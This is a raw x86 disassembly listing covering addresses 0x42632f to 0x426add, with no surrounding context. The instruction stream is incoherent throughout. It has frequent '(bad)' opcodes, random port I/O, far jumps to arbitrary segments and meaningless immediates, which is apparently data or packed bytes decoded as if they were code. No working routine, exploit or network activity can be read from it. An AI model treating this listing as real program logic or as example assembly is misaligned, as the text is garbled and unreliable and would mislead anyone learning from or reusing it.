  42632f:	ret    0x7f91
  426332:	xrstors [eax+0x21]
  426336:	mov    ch,0x29
  426338:	mov    WORD PTR [ebx+esi*1-0x70],ds
  42633c:	imul   eax,DWORD PTR [edx],0x4c
  42633f:	rcr    DWORD PTR [eax+0x77],0x1c
  426343:	sti    
  426344:	mov    bh,0x60
  426346:	adc    DWORD PTR [ecx-0x138cad9a],ecx
  42634c:	les    eax,FWORD PTR [esi+ebp*4-0x342a373]
  426353:	fiadd  DWORD PTR gs:[ebp-0x1f0109f3]
  42635a:	pop    es
  42635b:	mov    BYTE PTR [ebp+0x4f],cl
  42635e:	pop    eax
  42635f:	mov    cl,0x57
  426361:	shl    dh,1
  426363:	sar    BYTE PTR [edx+ebp*2+0x3],0xb5
  426368:	shl    BYTE PTR [edx],1
  42636a:	sub    dh,BYTE PTR [eax]
  42636c:	sbb    ecx,DWORD PTR [ebp+eax*1+0x42480975]
  426373:	xlat   BYTE PTR ds:[bx]
  426375:	mov    cl,0x45
  426377:	inc    ebp
  426378:	add    al,0xaa
  42637a:	push   ss
  42637b:	and    dl,ah
  42637d:	int    0x12
  42637f:	mov    esp,DWORD PTR [edi]
  426381:	push   ss
  426382:	test   eax,0x4530e52b
  426387:	bound  ecx,QWORD PTR [edx+0x56]
  42638a:	loopne 0x42639f
  42638c:	and    dh,BYTE PTR [edx+0x10191624]
  426392:	sbb    esi,0xe64843ad
  426398:	push   ds
  426399:	add    eax,0x354552a8
  42639e:	lea    ebx,[ebx+ebx*2]
  4263a1:	test   al,0x68
  4263a3:	es dec edx
  4263a5:	lahf   
  4263a6:	xchg   esp,eax
  4263a7:	std    
  4263a8:	add    esp,0x7c
  4263ab:	aas    
  4263ac:	pop    eax
  4263ad:	arpl   WORD PTR [ecx+0x5539481e],dx
  4263b3:	cmp    ah,BYTE PTR [eax]
  4263b5:	mov    ch,0x70
  4263b7:	in     al,dx
  4263b8:	fdiv   DWORD PTR [ecx]
  4263ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263bb:	mov    dl,0xc8
  4263bd:	lods   al,BYTE PTR ds:[esi]
  4263be:	(bad)  
  4263c0:	fsubr  st(4),st
  4263c2:	add    al,0xb7
  4263c4:	lahf   
  4263c5:	cmp    bh,al
  4263c7:	jge    0x4263b4
  4263c9:	das    
  4263ca:	jecxz  0x426396
  4263cc:	inc    BYTE PTR ds:0x71f570be
  4263d2:	scas   al,BYTE PTR es:[edi]
  4263d3:	dec    eax
  4263d5:	jg     0x4263e1
  4263d7:	in     eax,dx
  4263d8:	test   BYTE PTR [ebx],dh
  4263da:	out    0xcf,eax
  4263dc:	and    dl,BYTE PTR [edx]
  4263de:	fdivr  DWORD PTR [edx+esi*2-0x473a6398]
  4263e5:	cli    
  4263e6:	outs   dx,BYTE PTR ds:[esi]
  4263e7:	add    BYTE PTR [ecx-0x1b55485d],bh
  4263ed:	xchg   BYTE PTR [eax-0x1ee69f40],ah
  4263f3:	mov    BYTE PTR [ebp-0x38ae9dc4],ah
  4263f9:	fist   DWORD PTR [ecx]
  4263fb:	shl    DWORD PTR [edi-0x441f7ce3],0xc0
  426402:	adc    al,0x4
  426404:	jo     0x4263b9
  426406:	loopne 0x426397
  426408:	mov    al,ds:0x8f82c8fe
  42640d:	push   ebx
  42640e:	mov    esi,0x53fcacb
  426413:	or     eax,0x3204f0c8
  426418:	mov    esi,0x8c66e7d9
  42641d:	mov    cl,BYTE PTR [esi+ebx*4+0x7b7940b5]
  426424:	enter  0xbc23,0x14
  426428:	pop    edx
  426429:	push   ss
  42642a:	and    eax,ecx
  42642c:	cmp    esi,DWORD PTR [edi]
  42642e:	xchg   esi,eax
  42642f:	fiadd  WORD PTR [eax]
  426431:	aaa    
  426432:	sub    ebp,DWORD PTR [ebx]
  426434:	sbb    eax,0xdd9a111
  426439:	and    bl,al
  42643b:	sti    
  42643c:	scas   al,BYTE PTR es:[edi]
  42643d:	sub    esp,DWORD PTR [esi]
  42643f:	rol    DWORD PTR [esi-0x2f6b2d17],cl
  426445:	push   esp
  426446:	push   0x476d891f
  42644b:	ja     0x426425
  42644d:	xor    bh,BYTE PTR [ebx]
  42644f:	pushf  
  426450:	shl    DWORD PTR [edi+0x7bb0aa2d],cl
  426456:	icebp  
  426457:	(bad)  
  426458:	pop    ss
  426459:	mov    edi,0xd3ffa3e3
  42645e:	sbb    ebx,DWORD PTR [esi+0x4a]
  426461:	add    eax,0x4011cb70
  426466:	fimul  WORD PTR [esi-0x7800b2d3]
  42646c:	in     eax,dx
  42646d:	fld    QWORD PTR [ebx-0x6ec16891]
  426473:	sub    dh,bl
  426475:	xor    eax,0x73c44683
  42647a:	sahf   
  42647b:	inc    ebx
  42647c:	dec    esp
  42647d:	push   eax
  42647e:	sub    esi,DWORD PTR [ecx]
  426480:	jmp    0xb20fca95
  426485:	push   edi
  426486:	xor    BYTE PTR [eax],ch
  426488:	daa    
  426489:	adc    al,0x8e
  42648b:	inc    eax
  42648c:	push   esp
  42648d:	sub    DWORD PTR [esi+ecx*1],ecx
  426490:	sbb    al,0xd5
  426492:	mov    dh,0x60
  426494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426495:	daa    
  426496:	xchg   ebx,eax
  426497:	sub    eax,0x1786d9cf
  42649c:	push   esp
  42649d:	push   ebp
  42649e:	xchg   esi,eax
  42649f:	je     0x426452
  4264a1:	mov    dl,0xda
  4264a3:	ror    dh,1
  4264a5:	jnp    0x426455
  4264a7:	pop    ebp
  4264a8:	(bad)  
  4264a9:	xor    bl,ch
  4264ab:	hlt    
  4264ac:	cmp    bl,BYTE PTR [ebx-0x719e0711]
  4264b2:	das    
  4264b3:	dec    ebp
  4264b4:	fst    DWORD PTR [ebx+0x2b654216]
  4264ba:	shl    DWORD PTR [ebp+edx*1+0x49],0x23
  4264bf:	inc    ecx
  4264c0:	add    bh,BYTE PTR [edx]
  4264c2:	scas   eax,DWORD PTR es:[edi]
  4264c3:	and    dl,bl
  4264c5:	retf   
  4264c6:	adc    dh,BYTE PTR [ecx-0x7db6ef7c]
  4264cc:	mov    BYTE PTR [eax],0xb1
  4264cf:	push   es
  4264d0:	cmc    
  4264d1:	leave  
  4264d2:	rcr    ebx,1
  4264d4:	jge    0x426520
  4264d6:	pop    ds
  4264d7:	or     BYTE PTR [eax-0x5e],0x27
  4264db:	into   
  4264dc:	adc    al,0xa8
  4264de:	dec    ecx
  4264df:	test   eax,0x7509a743
  4264e4:	add    DWORD PTR [edi-0x5074d2aa],edx
  4264ea:	push   edx
  4264eb:	imul   ebx,DWORD PTR [edx+0x340705da],0x56
  4264f2:	ret    0x12ac
  4264f5:	rcr    DWORD PTR [ecx],1
  4264f7:	ins    BYTE PTR es:[edi],dx
  4264f8:	out    dx,eax
  4264f9:	inc    edi
  4264fa:	push   ss
  4264fb:	sub    ecx,DWORD PTR [eax+0x21d6da44]
  426501:	bound  ebp,QWORD PTR [edx+0x44fadadc]
  426507:	adc    ecx,DWORD PTR [eax]
  426509:	pop    edx
  42650a:	jno    0x4264bc
  42650c:	jg     0x4264d6
  42650e:	outs   dx,BYTE PTR ds:[esi]
  42650f:	fisub  DWORD PTR [ebx]
  426511:	jbe    0x426550
  426513:	mov    ebx,0x77278f61
  426518:	mov    esi,0xfd9e67cc
  42651d:	xor    al,0x2f
  42651f:	pop    edi
  426520:	cmp    ecx,ebp
  426522:	pop    ds
  426523:	mov    edx,0xf03c4dfb
  426528:	cmp    eax,0xffa784ff
  42652d:	sar    DWORD PTR [edi-0x3c],0xe5
  426531:	scas   al,BYTE PTR es:[di]
  426533:	jb     0x42651f
  426535:	cld    
  426536:	imul   edx,esi,0xbcd94e4e
  42653c:	jb     0x426576
  42653e:	sub    al,0xb5
  426540:	push   ebp
  426541:	int3   
  426542:	xchg   esi,eax
  426543:	sub    DWORD PTR [edx+0x65204a23],esi
  426549:	mov    ah,0xe5
  42654b:	enter  0xb92a,0xce
  42654f:	dec    esi
  426550:	es inc eax
  426552:	iret   
  426553:	sbb    eax,0x1f7fe7fa
  426558:	xchg   esi,eax
  426559:	sti    
  42655a:	xor    DWORD PTR [eax],ecx
  42655c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42655d:	mov    al,ds:0x2f6f3303
  426562:	jnp    0x4264e4
  426564:	loope  0x4265d8
  426566:	sar    DWORD PTR [esi+0x3f],cl
  426569:	out    dx,eax
  42656a:	cmp    BYTE PTR [edi+0x6df9735f],al
  426570:	add    DWORD PTR [eax-0x7d],edi
  426573:	mov    edx,DWORD PTR [edx-0x151b34e5]
  426579:	mov    ebp,0x50e14671
  42657e:	dec    ebp
  42657f:	cwde   
  426580:	std    
  426581:	cmc    
  426582:	shl    DWORD PTR [edi-0x28],1
  426585:	cmp    edx,DWORD PTR [ecx-0x2b]
  426588:	ror    BYTE PTR [esi+0x1e],cl
  42658b:	icebp  
  42658c:	dec    esp
  42658d:	inc    ebx
  42658e:	punpcklwd mm2,DWORD PTR [edi]
  426591:	aaa    
  426592:	inc    edx
  426593:	sbb    BYTE PTR [edi+0x18763d92],cl
  426599:	out    dx,eax
  42659a:	hlt    
  42659b:	xor    eax,esi
  42659d:	push   edx
  42659e:	fild   QWORD PTR [edx+0xd26a9ae]
  4265a4:	push   ebp
  4265a5:	push   ebx
  4265a6:	fstp   DWORD PTR [ebp+0x26]
  4265a9:	dec    ebx
  4265aa:	(bad)  
  4265ab:	mov    bh,BYTE PTR [ecx]
  4265ad:	jnp    0x426585
  4265af:	scas   al,BYTE PTR es:[edi]
  4265b0:	scas   al,BYTE PTR es:[edi]
  4265b1:	push   ebp
  4265b2:	(bad)  
  4265b4:	ret    
  4265b5:	xchg   edi,eax
  4265b6:	push   edx
  4265b7:	clc    
  4265b8:	std    
  4265b9:	xchg   esi,eax
  4265ba:	outs   dx,BYTE PTR ds:[esi]
  4265bb:	std    
  4265bc:	mov    dh,0xb1
  4265be:	mov    cl,0xa1
  4265c0:	out    dx,eax
  4265c1:	jns    0x4265ba
  4265c3:	fldcw  WORD PTR [edi]
  4265c5:	test   BYTE PTR [edx-0x2d96db82],ch
  4265cb:	and    esi,DWORD PTR [ecx]
  4265cd:	addr16 aam 0x12
  4265d0:	push   ds
  4265d1:	mov    esp,0x5694b06b
  4265d6:	xlat   BYTE PTR ds:[ebx]
  4265d7:	or     al,0xa4
  4265d9:	sahf   
  4265da:	enter  0x5e73,0xc6
  4265de:	nop
  4265df:	std    
  4265e0:	pop    es
  4265e1:	cmp    edi,0x36
  4265e4:	pop    eax
  4265e5:	xchg   ebx,eax
  4265e6:	shl    DWORD PTR [edx],0xf8
  4265e9:	ss dec esi
  4265eb:	and    al,0xc9
  4265ed:	loope  0x426630
  4265ef:	dec    edi
  4265f0:	sbb    edi,DWORD PTR ds:0xdf426276
  4265f6:	cmc    
  4265f7:	pop    esp
  4265f8:	mov    ebp,0xbe665f2
  4265fd:	sbb    ebp,DWORD PTR [ebp+edi*4-0xd]
  426601:	jg     0x426666
  426603:	gs mov ch,0xe1
  426606:	inc    eax
  426607:	test   BYTE PTR [eax],0xd3
  42660a:	inc    eax
  42660b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42660c:	push   esi
  42660d:	jne    0x4265a6
  42660f:	jb     0x42668d
  426611:	mov    esp,0x217349ef
  426616:	out    dx,al
  426617:	inc    ecx
  426618:	cmp    dl,BYTE PTR [edx+edx*2]
  42661b:	push   edi
  42661c:	mov    eax,ds:0xfcd81aa9
  426621:	fs aad 0x5a
  426624:	je     0x4265f4
  426626:	and    eax,edi
  426628:	mov    ds:0x6290a29c,al
  42662d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42662e:	fistp  DWORD PTR [edi-0x174b102f]
  426634:	mov    eax,ds:0x5112e6b3
  426639:	xor    edx,esi
  42663b:	sub    eax,0xadf42f6
  426640:	push   ecx
  426641:	adc    edi,DWORD PTR [ebp-0x23]
  426644:	adc    ebp,DWORD PTR [ebx-0x8309418]
  42664a:	inc    esp
  42664b:	jmp    0x3f876238
  426650:	(bad)  
  426651:	in     al,dx
  426652:	in     eax,dx
  426653:	ja     0x426621
  426655:	ja     0x42666a
  426657:	cmp    dl,BYTE PTR [ebx-0x4c]
  42665a:	(bad)  
  42665b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42665c:	mov    esi,0xd0037cf3
  426661:	adc    cl,dl
  426663:	imul   eax,DWORD PTR [edi+0x22],0xba73f6d1
  42666a:	mov    esi,0x3b649d2d
  42666f:	adc    dh,BYTE PTR [ebx-0x73]
  426672:	jl     0x42665d
  426674:	loopne 0x426680
  426676:	lahf   
  426677:	fprem  
  426679:	sbb    al,0x6f
  42667b:	jg     0x426662
  42667d:	sub    ebx,DWORD PTR [eax+0x411fa5fe]
  426683:	stos   BYTE PTR es:[edi],al
  426684:	inc    ebx
  426685:	scas   al,BYTE PTR es:[edi]
  426686:	pop    edi
  426687:	mov    ecx,0xa9c4a684
  42668c:	mov    bl,0x4b
  42668e:	dec    esp
  42668f:	es cdq 
  426691:	or     esi,DWORD PTR [ecx-0x5e8ae6bc]
  426697:	into   
  426698:	or     edi,edi
  42669a:	inc    ebx
  42669b:	outs   dx,BYTE PTR ds:[esi]
  42669c:	dec    esi
  42669d:	sub    ah,ah
  42669f:	pusha  
  4266a0:	sub    BYTE PTR [esi-0x6],bh
  4266a3:	enter  0xcae5,0xef
  4266a7:	mov    eax,ds:0x3afef9f8
  4266ac:	inc    esp
  4266ad:	push   ecx
  4266ae:	dec    ecx
  4266af:	inc    ebx
  4266b0:	in     eax,dx
  4266b1:	jge    0x4266a4
  4266b3:	iret   
  4266b4:	shl    eax,cl
  4266b6:	mov    cs,edx
  4266b8:	addr16 jle 0x426669
  4266bb:	sub    al,0xa0
  4266bd:	cmp    DWORD PTR [esi-0xc038061],ebx
  4266c3:	and    ecx,0xc7b96467
  4266c9:	fbstp  TBYTE PTR [ecx-0x5141de47]
  4266cf:	pop    ecx
  4266d0:	cdq    
  4266d1:	addr16 popa 
  4266d3:	je     0x4266f1
  4266d5:	loop   0x4266b0
  4266d7:	and    BYTE PTR [ebx],0xb
  4266da:	sahf   
  4266db:	mov    ecx,0x511bcf06
  4266e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266e1:	sbb    BYTE PTR [edi-0x4bd3e974],bl
  4266e7:	sub    eax,0x5dfc3084
  4266ec:	(bad)  
  4266ed:	and    DWORD PTR [edx*2-0x53b049f8],ebx
  4266f4:	cmp    edx,DWORD PTR [esi+0x25]
  4266f7:	aam    0x93
  4266f9:	mov    bh,BYTE PTR [edx+0x52]
  4266fc:	fstp   TBYTE PTR [esi-0x1e9a5f6e]
  426702:	push   ebx
  426703:	push   esp
  426704:	mov    ebp,0xf6b8732b
  426709:	(bad)  
  42670a:	jle    0x4266f9
  42670c:	outs   dx,DWORD PTR ds:[esi]
  42670d:	mov    ebp,0xde7fec64
  426712:	pop    esi
  426713:	adc    al,BYTE PTR ds:0x7f43f000
  426719:	idiv   DWORD PTR [ebx-0x6]
  42671c:	lds    ebp,FWORD PTR [ecx-0x3]
  42671f:	mov    bh,0x35
  426721:	test   eax,0xdf488c6a
  426726:	xchg   ebx,eax
  426727:	jp     0x426784
  426729:	sbb    eax,0x7aeb2a53
  42672e:	and    ebx,DWORD PTR [esi+0x2d]
  426731:	push   0xd923bc65
  426736:	into   
  426737:	pop    ecx
  426738:	popa   
  426739:	add    BYTE PTR [ebx-0x57],0x2c
  42673d:	ret    
  42673e:	stc    
  42673f:	inc    ebp
  426740:	out    0x3,al
  426742:	sbb    DWORD PTR [edi+0x69],edi
  426745:	and    al,0xf4
  426747:	imul   ebx,eax,0x2fce9687
  42674d:	inc    ecx
  42674e:	pusha  
  42674f:	in     eax,dx
  426750:	int3   
  426751:	xor    dl,BYTE PTR [eax+0x59e576b8]
  426757:	cli    
  426758:	jmp    0xf2011dd2
  42675d:	pop    ds
  42675e:	push   edx
  42675f:	sub    eax,0xa7dd3328
  426764:	pop    esi
  426765:	stos   BYTE PTR es:[edi],al
  426766:	push   eax
  426767:	aam    0x52
  426769:	jle    0x426752
  42676b:	mov    bh,BYTE PTR [edx]
  42676d:	ret    
  42676e:	lahf   
  42676f:	jp     0x426741
  426771:	(bad)  
  426772:	cwde   
  426773:	pop    ecx
  426774:	and    ch,BYTE PTR [eax+0x27]
  426777:	adc    BYTE PTR [ebx],bl
  426779:	rcr    ah,cl
  42677b:	stos   BYTE PTR es:[edi],al
  42677c:	cld    
  42677d:	push   esp
  42677e:	adc    esi,DWORD PTR [esi+ebp*2-0x27]
  426782:	sbb    dh,BYTE PTR [ecx]
  426784:	pop    esp
  426785:	xor    eax,0x6814e809
  42678a:	adc    bh,BYTE PTR ds:0x7bb6a93d
  426790:	mov    edi,DWORD PTR [ebp+0x24]
  426793:	int    0x20
  426795:	out    dx,al
  426796:	or     DWORD PTR [ecx-0x12],esi
  426799:	mov    cl,0x78
  42679b:	aas    
  42679c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42679d:	(bad)  
  42679e:	fisttp QWORD PTR [ebp-0x73b0be1d]
  4267a4:	xchg   ecx,eax
  4267a5:	xchg   esp,eax
  4267a6:	jp     0x4267b0
  4267a8:	sub    eax,0x64a68f68
  4267ad:	mov    ebp,DWORD PTR [edx+0x24]
  4267b0:	jne    0xb466edec
  4267b6:	out    dx,al
  4267b7:	test   eax,0x52110097
  4267bc:	imul   ebp,DWORD PTR [ecx-0x5c72213a],0x58
  4267c3:	jmp    0x1138fd1e
  4267c8:	push   ds
  4267c9:	(bad)  
  4267cb:	in     al,0xb7
  4267cd:	scas   eax,DWORD PTR es:[edi]
  4267ce:	aas    
  4267cf:	retf   0xbcb7
  4267d2:	loope  0x426812
  4267d4:	es jg  0x4267d0
  4267d7:	inc    edi
  4267d8:	call   0x67e83330
  4267dd:	scas   eax,DWORD PTR es:[edi]
  4267de:	xor    bh,BYTE PTR [ebx]
  4267e0:	cwde   
  4267e1:	mov    bl,0x7c
  4267e3:	jl     0x4267c7
  4267e5:	jecxz  0x4267d3
  4267e7:	loope  0x426826
  4267e9:	dec    ecx
  4267ea:	(bad)  
  4267eb:	mov    bh,0xb7
  4267ed:	out    dx,al
  4267ee:	jbe    0x4267cf
  4267f0:	jp     0x426852
  4267f2:	repnz mov bl,0xb0
  4267f5:	pop    DWORD PTR [esi*1-0x57272399]
  4267fc:	fwait
  4267fd:	rol    BYTE PTR [edi],1
  4267ff:	cmp    edx,DWORD PTR [edi-0xf]
  426802:	retf   
  426803:	inc    ebp
  426804:	(bad)  
  426805:	es gs dec ecx
  426808:	push   ss
  426809:	in     al,dx
  42680a:	cld    
  42680b:	cmc    
  42680c:	icebp  
  42680d:	mov    esi,0x45af02e4
  426812:	shl    BYTE PTR [edx],1
  426814:	sub    dl,BYTE PTR [eax-0x2c]
  426817:	sbb    ah,BYTE PTR [ebx]
  426819:	mov    WORD PTR [edx],ss
  42681b:	jge    0x4267a3
  42681d:	mov    eax,0x8c9fcfbe
  426822:	add    BYTE PTR [edx+0x209eca32],dh
  426828:	imul   esp,esp,0x71f2a621
  42682e:	leave  
  42682f:	cmp    bh,dh
  426831:	cli    
  426832:	and    BYTE PTR [ecx-0x728b9aa2],0x60
  426839:	jle    0x4268b7
  42683b:	test   al,0x33
  42683d:	xor    BYTE PTR [eax+0x602566f3],0x79
  426844:	sub    ebx,DWORD PTR [ecx+0x5f]
  426847:	push   0xb2987d0e
  42684c:	push   0x9adf92f0
  426851:	dec    ecx
  426852:	adc    ebp,DWORD PTR [eax+0x28e630f2]
  426858:	dec    ebx
  426859:	(bad)  
  42685a:	and    DWORD PTR [edx],0x7a
  42685d:	jo     0x4268dc
  42685f:	out    dx,eax
  426860:	pop    ds
  426861:	setae  ah
  426864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426865:	fistp  DWORD PTR [esi+0x32]
  426868:	add    eax,0xa1b1b1b0
  42686d:	scas   eax,DWORD PTR es:[edi]
  42686e:	jnp    0x42685d
  426870:	stos   DWORD PTR es:[edi],eax
  426871:	aas    
  426872:	sbb    BYTE PTR [edx+0x75],al
  426875:	xor    eax,0x6d1f6aa9
  42687a:	add    ebp,eax
  42687c:	aam    0x47
  42687e:	jnp    0x426807
  426880:	rcl    DWORD PTR [ecx+0x40],0x5e
  426884:	inc    eax
  426885:	les    edi,FWORD PTR [ebp+0x7a]
  426888:	xchg   ebx,eax
  426889:	addr16 ret 
  42688b:	jb     0x4268c3
  42688d:	adc    DWORD PTR [edi-0x1e],ebp
  426890:	nop
  426891:	mov    ebp,0x583a345d
  426896:	xor    BYTE PTR [ecx+0x32],0x89
  42689a:	mov    fs,WORD PTR [edi]
  42689c:	addr16 mov dh,0x4e
  42689f:	cmp    cl,BYTE PTR [esi+edi*1-0x73]
  4268a3:	cmp    eax,0x265c2f97
  4268a8:	dec    ecx
  4268a9:	iret   
  4268aa:	out    0xbb,al
  4268ac:	jg     0x426846
  4268ae:	aad    0x13
  4268b0:	adc    eax,0x5508ce31
  4268b5:	and    BYTE PTR [ecx],ch
  4268b7:	hlt    
  4268b8:	push   ecx
  4268b9:	sub    eax,0xd01e7f57
  4268be:	mov    ecx,0xb30287a0
  4268c3:	pusha  
  4268c4:	or     al,0xbf
  4268c6:	dec    eax
  4268c7:	or     DWORD PTR [edi-0x5a],ebx
  4268ca:	pop    ecx
  4268cb:	(bad)  
  4268cc:	mov    dh,0x5e
  4268ce:	pop    ds
  4268cf:	rcl    BYTE PTR [ecx-0x1e],1
  4268d2:	jmp    0x42690a
  4268d4:	leave  
  4268d5:	add    dl,BYTE PTR [edx+0x57]
  4268d8:	(bad)  
  4268d9:	pop    ebp
  4268da:	je     0x426886
  4268dc:	xor    cl,al
  4268de:	jl     0x42691f
  4268e0:	sbb    al,dl
  4268e2:	pop    esi
  4268e3:	dec    ebp
  4268e4:	fmul   QWORD PTR [edx-0x3c]
  4268e7:	jmp    0x426872
  4268e9:	js     0x42694b
  4268eb:	mul    DWORD PTR [ebx]
  4268ed:	inc    ecx
  4268ee:	nop
  4268ef:	ds pop eax
  4268f1:	loop   0x426881
  4268f3:	jae    0x4268f5
  4268f5:	fisubr DWORD PTR [edx]
  4268f7:	ficomp DWORD PTR [edx-0x2c]
  4268fa:	and    DWORD PTR [ebp+0x9],esi
  4268fd:	fiadd  DWORD PTR [edx+ebp*2+0x12]
  426901:	jge    0x426920
  426903:	jmp    0x89aeaf51
  426908:	in     eax,0x1e
  42690a:	je     0x426907
  42690c:	inc    edx
  42690d:	fimul  DWORD PTR ds:0x1530e2b6
  426913:	xor    al,0x1
  426915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426916:	(bad)  
  426917:	ins    DWORD PTR es:[edi],dx
  426918:	cmp    BYTE PTR [ecx],al
  42691a:	fcmovbe st,st(7)
  42691c:	mov    ah,0x3d
  42691e:	sbb    al,0x1e
  426920:	sub    bl,BYTE PTR [edi+0x6fc8bcdf]
  426926:	outs   dx,DWORD PTR ds:[esi]
  426927:	cmp    eax,0xf6bdb7c6
  42692c:	ins    DWORD PTR es:[edi],dx
  42692d:	aam    0x7f
  42692f:	in     eax,dx
  426930:	pop    ds
  426931:	ror    dl,0x15
  426934:	jbe    0x4269a4
  426936:	in     al,dx
  426937:	adc    BYTE PTR [edx+0x62],al
  42693a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42693c:	cs (bad) 
  42693e:	cmp    esi,DWORD PTR [edi+0x241706f2]
  426944:	hlt    
  426945:	stc    
  426946:	add    eax,0xa727a5df
  42694b:	ret    
  42694c:	call   0xa9a0:0xaa8b67e0
  426953:	test   dl,dh
  426955:	inc    edx
  426956:	mov    cl,0xc2
  426958:	leave  
  426959:	mov    bl,0xe1
  42695b:	inc    esi
  42695c:	ret    0x459
  42695f:	cwde   
  426960:	bound  ecx,QWORD PTR [ebp-0x206f7af9]
  426966:	std    
  426967:	jo     0x4268f5
  426969:	sub    DWORD PTR [ecx+esi*8],ecx
  42696c:	mov    al,0xa0
  42696e:	out    dx,eax
  42696f:	das    
  426970:	out    0xf4,eax
  426972:	ins    BYTE PTR es:[edi],dx
  426973:	mov    ebx,0x4c648823
  426978:	sbb    BYTE PTR [edx+0x49],cl
  42697b:	ficom  DWORD PTR [ecx]
  42697d:	push   edi
  42697e:	or     al,0x1a
  426980:	retf   0x1bb4
  426983:	ret    0xa38c
  426986:	sti    
  426987:	lock and DWORD PTR [eax-0xed9adb0],0x6b3efad6
  426992:	xchg   ebx,eax
  426993:	nop
  426994:	inc    ebx
  426995:	pop    ds
  426996:	jbe    0x4269d6
  426998:	pop    ebx
  426999:	sub    DWORD PTR [ebx-0x48],edi
  42699c:	inc    esi
  42699d:	adc    eax,0xa1baaa6a
  4269a2:	stos   BYTE PTR es:[edi],al
  4269a3:	imul   edx,DWORD PTR [eax+0x2b5721e0],0xffffffe2
  4269aa:	jmp    0xa840:0x248668bb
  4269b1:	jmp    0xff7f:0x6b73e5fd
  4269b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b9:	xchg   bh,bh
  4269bb:	lock adc ch,BYTE PTR [edx]
  4269be:	add    BYTE PTR [eax+0x7f27fc9f],al
  4269c4:	data16 jg 0x426a28
  4269c7:	xor    bh,ch
  4269c9:	pop    edi
  4269ca:	lods   al,BYTE PTR ds:[esi]
  4269cb:	dec    ebx
  4269cc:	dec    ebp
  4269cd:	mov    ah,0x65
  4269cf:	sahf   
  4269d0:	mov    ebp,0xc6084ca3
  4269d5:	or     BYTE PTR [edx+0x5d],0x11
  4269d9:	jmp    0x7dfe:0xc7f1fd60
  4269e0:	sahf   
  4269e1:	sbb    BYTE PTR [ebx],ah
  4269e3:	enter  0x3aaf,0xc0
  4269e7:	inc    dl
  4269e9:	inc    ebx
  4269ea:	mov    edx,DWORD PTR [esi+0x6ee69550]
  4269f0:	xchg   ebx,eax
  4269f1:	push   cs
  4269f2:	arpl   WORD PTR [ebx],si
  4269f4:	sub    cl,al
  4269f6:	dec    ecx
  4269f7:	and    al,0x6b
  4269f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269fa:	xchg   edi,eax
  4269fb:	or     al,0x6e
  4269fd:	xor    DWORD PTR [edi-0x11],esp
  426a00:	jne    0x426a41
  426a02:	retf   0xdb89
  426a05:	xchg   edi,eax
  426a06:	fnstcw WORD PTR [edi]
  426a08:	cmp    al,0x20
  426a0a:	aam    0x56
  426a0c:	shl    BYTE PTR [edx],0x9f
  426a0f:	inc    edi
  426a10:	push   edx
  426a11:	stos   DWORD PTR es:[edi],eax
  426a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a13:	pop    eax
  426a14:	xchg   ecx,eax
  426a15:	push   cs
  426a16:	lds    esp,FWORD PTR [eax]
  426a18:	sti    
  426a19:	pop    esp
  426a1a:	mov    ebp,0xb4abc640
  426a1f:	mov    dl,0x25
  426a21:	xchg   ecx,eax
  426a22:	push   0xffffffb0
  426a24:	sub    BYTE PTR [ecx],al
  426a26:	mov    ah,0x6
  426a28:	popf   
  426a29:	add    BYTE PTR [ecx-0x34],al
  426a2c:	jmp    0x9eb2:0x55056801
  426a33:	mov    ah,dh
  426a35:	test   BYTE PTR [eax],bl
  426a37:	pusha  
  426a38:	xchg   BYTE PTR [edi+0x288fda33],bl
  426a3e:	xor    al,0x73
  426a40:	push   edx
  426a41:	fstp   QWORD PTR [ecx+0x2ca56992]
  426a47:	xchg   BYTE PTR [ecx-0xf],ch
  426a4a:	arpl   WORD PTR [ebx+0x24807de2],si
  426a50:	mov    dl,dh
  426a52:	(bad)  
  426a53:	cmp    esp,DWORD PTR ds:0xeba92d48
  426a59:	dec    ecx
  426a5a:	xor    ecx,DWORD PTR [eax-0x63]
  426a5d:	pop    DWORD PTR [ecx-0x566ddb28]
  426a63:	xchg   ebx,eax
  426a64:	mov    DWORD PTR [ebp+0x3dbd67d8],edi
  426a6a:	jecxz  0x426a6a
  426a6c:	sahf   
  426a6d:	lock shl ch,1
  426a70:	sub    edi,esp
  426a72:	cld    
  426a73:	test   DWORD PTR [edi-0x35],edi
  426a76:	mov    ebx,0xd63afeee
  426a7b:	mov    esi,0xdae937f3
  426a80:	cmp    DWORD PTR [ebx-0x25],edi
  426a83:	pop    es
  426a84:	xor    al,0x8d
  426a86:	xor    eax,0xf638b0f0
  426a8b:	and    al,bh
  426a8d:	lds    edx,FWORD PTR [edi-0x30e50fd2]
  426a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a94:	enter  0x8e9f,0x15
  426a98:	inc    edx
  426a99:	push   ss
  426a9a:	sbb    dh,BYTE PTR [edi-0x7c841a24]
  426aa0:	lahf   
  426aa1:	jle    0x426b07
  426aa3:	jmp    0x8c4a2da0
  426aa8:	adc    al,0x76
  426aaa:	mov    esi,0x7d7902ae
  426aaf:	and    dl,0x22
  426ab2:	in     al,0xfb
  426ab4:	sbb    ah,0xf3
  426ab7:	and    BYTE PTR [ebx+0x6f],al
  426aba:	sbb    ebp,DWORD PTR [edi]
  426abc:	jnp    0x426a44
  426abe:	bound  edi,QWORD PTR [ebp-0x56bc51b9]
  426ac4:	out    dx,al
  426ac5:	or     esp,DWORD PTR [ebx+0x56e2809c]
  426acb:	cwde   
  426acc:	in     eax,0xce
  426ace:	outs   dx,BYTE PTR ds:[esi]
  426acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ad0:	enter  0xeac8,0x33
  426ad4:	fisubr WORD PTR [edi+0x2]
  426ad7:	sub    eax,0x41560962
  426adc:	inc    edx
  426add:	adc    DWORD PTR [eax+0x0],esi
